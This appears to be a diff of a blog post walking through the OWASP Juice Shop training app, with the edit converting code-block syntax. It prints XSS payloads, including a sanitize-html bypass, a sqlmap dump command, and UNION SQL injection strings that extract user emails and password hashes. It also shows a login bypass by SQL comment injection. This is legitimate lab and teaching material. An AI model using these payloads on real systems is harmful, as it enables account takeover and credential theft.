@@ -10,29 +10,29 @@ tags=["web", "owasp"]
 #OWASP Juice Shop
 
 I started this process off by trying to throw some JavaScript into the search box, looks vulnerable to XSS:
-{% highlight html %}
+```html
 <script type="text/javascript">alert('hi');</script>
-{% endhighlight %}
+```
 Results in an alert popping up after the site issues a GET request to the server, followed by a UI alert stating an objective had been reached, finding unhandled exceptions.
 
 Next I looked through the login page's source to see if anything sticks out and found this:
 
-{% highlight html %}
+```html
 <!--
     <li class="dropdown">
        <a href="#/score-board">Score Board</a>
     </li>
 -->
-{% endhighlight %}
+```
 Looks like I found the scoreboard for the app and it is available at the following route:
 
-{% highlight html %}
+```html
 <a href="#/score-board">Score Board</a>
-{% endhighlight %}
+```
 Now that I've got a list of the challenges I do the following as a search:
-{% highlight html %}
+```html
 <script>alert("XSS1")</script>
-{% endhighlight %}
+```
 Which successfully performs a reflected XSS attack.
 
 I next went through the process of placing an order and noticed the URL for my receipt was using a subdirectory, I tried browsing to the folder /ftp and was presented with files I could download, which ended up getting me another achievement: access a confidential document
@@ -67,7 +67,7 @@ Another challenge that has been sticking in my head is the one about applying ad
 
 
 For the coupon file:
-{% highlight bash %}
+```bash
 n<MibgC7sn
 mNYS#gC7sn
 o*IVigC7sn
@@ -80,14 +80,14 @@ q:<IqgC7sn
 pEw8ogC7sn
 pes[BgC7sn
 l}6D$gC7ss
-{% endhighlight %}
+```
 
 Now that I have the site's package.json file (node js package config) I can run an npm install and see if any dependencies have vulnerabilities, after running an npm install looks like sequelize and minimatch are both vulnerable because they're using an outdate package.  Looks like another challenge solver: Inform the shop about a vulnerable library it is using.
 
 Looking back at the score board looks like we have an item around getting back all the users/passwords from our database, time to fire up sqlmap.  I ended up running the following command which got me back the search parameter to use:
-{% highlight bash %}
+```bash
 sqlmap -u "https://quiet-lake-65056.herokuapp.com/rest/product/search?q=test" --level=2 -p "q" --dbms="sqlite" --dump --proxy=http://10.1.206.89:8081
-{% endhighlight %}
+```
 
 The parameters are used as follows:
 
@@ -99,15 +99,15 @@ The parameters are used as follows:
 * -proxy = the proxy to run requests through
 
 Once we get through things the following comes back with the following:
-{% highlight sql %}
+```sql
 sear')) union all select null,null,null,null,null,null,null,'qzzjq'||'QHWDqQappkdzrcmfZObclJekqtZryURacjvmYOqV'||'qaakq'-- IvXq
-{% endhighlight %}
+```
 Plugging that into the browser we get a partial product grid.  Time to start figuring out how to get the users and password back.
 
 I ended up with this for the final search query:
-{% highlight sql %}
+```sql
 sear')) union all select id,email,password,null,null,null,null,'qzzjq'||'QHWDqQappkdzrcmfZObclJekqtZryURacjvmYOqV'||'qaakq' from users-- IvXq
-{% endhighlight %}
+```
 A list of users and their hashed passwords, another challenge completed.
 
 Now to try and figure out some of these passwords.  I put the hashes all into this site:
@@ -137,51 +137,51 @@ Now for more XSS based challenges, looks like we have 3 more outstanding, the fi
 I had to try several forms first of which was the complaint form, then the contact form, and finally the user registration form.  Through this page I was able to register a user, then catch the request for submitting the user's data and put in the required XSS (&lt;script&gt;alert("XSS2")&lt;/script&gt;) payload as the user's name, another challenge completed.
 
 The next XSS challenge is to perform a persisted XSS attack without using the front-end at all, this seems like talking directly to the site's API.  Watching the initial site load requests in Burp it looks like we have a rest API behind the scenes the request I saw this in was making a call to /rest/products, since rest uses GET/POST/PUT I'm thinking we can possibly store the XSS payload by doing a PUT for a given product.  I started out by simply trying: <https://quiet-lake-65056.herokuapp.com/api> to access the API and get some info, which returns:
-{% highlight json  %}
+```json
 {"status":"success","data":[{"name":"BasketItem","tableName":"BasketItems"},{"name":"Challenge","tableName":"Challenges"},{"name":"Complaint","tableName":"Complaints"},{"name":"Feedback","tableName":"Feedbacks"},{"name":"Product","tableName":"Products"},{"name":"User","tableName":"Users"}]}
-{% endhighlight %}
+```
 
 This looks like a map of the different server-side API calls start points.
 
 I'm going to start by trying to perform a GET through HttpRequested (firefox plugin to make http requests).  <https://quiet-lake-65056.herokuapp.com/api/Products/> was my first try, with a GET this just returns all the products in a JSON response object.
 
 So far so good, next I tried getting a single product with this URL: <https://quiet-lake-65056.herokuapp.com/api/Products/1>, success.  Now I'm guessing we can use a PUT to update this object and persist the payload.  Looking at the JSON that comes back from the GET I built this as the payload for a PUT to update a product:
-{%highlight json %}
+```json
 {"description": "<script>alert(\"XSS3\")</script>"}
-{% endhighlight %}
+```
 
 Success
 
 Now for the last challenge, bypassing a server-side security mechanism.  After some pondering I decided a good way to get visibility into the server-side code would be the package.json backup we retrieved in an earlier challenge.  Int he dependencies for the application there is an item called sanitize-html.  I am guessing this will be what I have to get past.  After googling the node module and looking through issues from the specific version called out in dependencies I found a security issue based on recursive application of sanitization.  Here was the item identified in the issue:
 
-{% highlight html %}
+```html
 <<img src="csrf-attack"/>img src="csrf-attack"/>
-{% endhighlight %}
+```
 
 would translate to:
 
-{% highlight html %}
+```html
 <img src="csrf-attack"/>
-{% endhighlight %}
+```
 
 Now to try and do that with our required XSS payload.  After some tinkering I ended up submitting this as the message in the contact form to complete the challenge:
 
-{% highlight html %}
+```html
 <<script>alert("XSS4")</script>script>alert("XSS4")<</script>/script>
-{% endhighlight %}
+```
 
 Next challenge: Wherever you go there you are.  This was quite perplexing, I ended up googling the challenge to get some help.  It turns out the "fork me on github" link does a redirect, rather than just linking to github, seems super weird given the scenario, but anyway, I started in on this and was able to figure out that passing a URL encoded null character allowed me to redirect back to the juice shop home page (which loads all funky) then going back to the site normally I had completed the challenge.
 
 Another challenge I have been having trouble with is the item getting the Christmas 2014 deal and buying it.  Since we know the search is vulnerable to SQL injection I started by trying to get back all products rather than the ones that are displayed on a page with this search:
 
-{% highlight sql %}
+```sql
 sear')) union all select null,id,description,price,null,null,null,null from products --
-{% endhighlight %}
+```
 This got me the ability to see the item and think I was adding it to my cart, but I wasn't ever able to actually purchase the item.  After googling and watch a video from 7 minute security I had the following payload (provided by OWASP dev team):
 
-{% highlight sql %}
+```sql
 christmas%25'))--
-{% endhighlight %}
+```
 
 The %25 ends up decoding to % which closes the SQL like that is being used for a keyword search, my guess here is that the UNION ALL method I tried first was not grabbing some piece of data that was required for the angular code to properly bind all its parameters on the front-end resulting in an improper add to basket.
 
@@ -195,21 +195,21 @@ This one was pretty tough.  I had to find a walkthrough to discover that my hero
 
 Watching requests in Burp I was able to see the requests and what was coming back to the site from a Google login, this was posted to /api/Users:
 
-{% highlight json %}
+```json
 {"email":"m4l1c3@m4l1ce.me","password":"bTRsMWMzQG00bDFjZS5tZQ=="}
-{% endhighlight %}
+```
 
 Looks like a base64 encoded password gets sent back from Google, which was then forwarded to /rest/user/login:
 
-{% highlight json %}
+```json
 {"email":"m4l1c3@m4l1ce.me","password":"bTRsMWMzQG00bDFjZS5tZQ==","oauth":true}
-{% endhighlight %}
+```
 
 After running
 
-{% highlight bash %}
+```bash
 echo bTRsMWMzQG00bDFjZS5tZQ== | base64 -D m4l1c3@m4l1c3.me
-{% endhighlight %}
+```
 
 I get the email back.
 
@@ -231,9 +231,9 @@ bender@juice-sh.op'--
 
 This ends up making the query look like:
 
-{% highlight sql %}
+```sql
 SELECT * FROM USERS WHERE email='bender@juice-sh.op'
-{% endhighlight %}
+```
 
 And this logs us in, now that we're impersonating Bender we should change his password to get the other challenge, looking at the change password page, looks like we would need to know his password, which we do not.  Looking at the requests in Burp it makes a GET request to update the password, seems weird since data is being written, but whatever I guess.
 
